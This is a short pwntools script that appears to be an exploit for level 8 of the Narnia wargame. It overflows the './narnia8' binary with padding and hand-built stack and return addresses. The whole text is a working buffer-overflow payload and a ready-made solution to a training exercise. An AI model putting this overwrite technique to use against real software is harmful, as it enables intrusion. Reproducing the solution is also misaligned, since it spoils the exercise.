from pwn import * 

payload = cyclic(19)
p = process(["./narnia8",payload+b"\xec\xffH$\xec\xff\xa7\x84\x04\x08\xab/\xec\xff"+b"AAAA"])
print(p.recvall())
